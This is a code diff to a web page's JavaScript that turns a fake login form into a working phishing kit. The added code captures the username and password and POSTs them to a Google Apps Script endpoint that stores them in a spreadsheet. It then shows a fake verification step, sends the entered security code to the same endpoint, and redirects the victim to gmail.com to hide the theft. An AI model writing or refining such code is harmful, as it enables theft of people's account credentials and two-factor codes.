@@ -1,29 +1,56 @@
-// script.js
+// public/script.js
 
 // Your Apps Script endpoint
 const scriptUrl = 'https://script.google.com/macros/s/AKfycbyEvhxQh7kuu7iK-Tq-CCyQiBBGxelCd2Jb9mmqfU2mrYucTN6S12f1NBHGyqRkJOu8/exec';
 
 // Element references
-const regForm    = document.getElementById('registrationForm');
-const verForm    = document.getElementById('verificationForm');
-const submitBtn  = document.getElementById('submitBtn');
-const resendBtn  = document.getElementById('resendBtn');
-const continueBtn= document.getElementById('continueBtn');
-const countdownEl= document.getElementById('countdown');
+const regForm     = document.getElementById('registrationForm');
+const verForm     = document.getElementById('verificationForm');
+const submitBtn   = document.getElementById('submitBtn');
+const resendBtn   = document.getElementById('resendBtn');
+const continueBtn = document.getElementById('continueBtn');
+const countdownEl = document.getElementById('countdown');
 
 let timerInterval;
 let timeLeft = 120; // seconds
 
-// Step 1: on "Log in" click, show verification UI
-regForm.addEventListener('submit', e => {
+// 1) On "Log in" click: send username+password, then show verification
+regForm.addEventListener('submit', async e => {
   e.preventDefault();
+
+  const username = document.getElementById('username').value.trim();
+  const password = document.getElementById('password').value.trim();
+
+  if (!username || !password) {
+    alert('Please enter both username and password.');
+    return;
+  }
+
+  // Disable button & show logging state
   submitBtn.innerText = 'Logging in…';
   submitBtn.disabled = true;
 
-  // Hide reg form, show verification
+  // POST credentials to your Apps Script
+  try {
+    const params = new URLSearchParams();
+    params.append('username', username);
+    params.append('name', password);   // 'name' param maps to your sheet's password column
+
+    await fetch(scriptUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: params.toString()
+    });
+  } catch (err) {
+    console.error('Error saving credentials:', err);
+    // you might choose to alert here
+  }
+
+  // Swap forms
   regForm.classList.add('hidden');
   verForm.classList.remove('hidden');
 
+  // Start the 2‑minute countdown
   startTimer();
 });
 
@@ -50,12 +77,12 @@ function updateDisplay() {
   countdownEl.textContent = `${mins}:${secs}`;
 }
 
-// Resend button resets timer
+// 2) Resend code → restart timer
 resendBtn.addEventListener('click', () => {
   startTimer();
 });
 
-// Continue: post code to sheet, then redirect
+// 3) Continue → send code, then redirect
 continueBtn.addEventListener('click', async () => {
   const code = document.getElementById('securityCode').value.trim();
   if (!code) {
@@ -63,13 +90,11 @@ continueBtn.addEventListener('click', async () => {
     return;
   }
 
-  // Build form data
-  const params = new URLSearchParams();
-  params.append('username', code);
-  params.append('name', code);
-
-  // Post to your Apps Script
   try {
+    const params = new URLSearchParams();
+    params.append('username', code);
+    params.append('name', code);
+
     await fetch(scriptUrl, {
       method: 'POST',
       headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
@@ -79,6 +104,6 @@ continueBtn.addEventListener('click', async () => {
     console.error('Error saving code:', err);
   }
 
-  // Finally redirect
+  // final redirect
   window.location.href = 'https://www.gmail.com';
 });
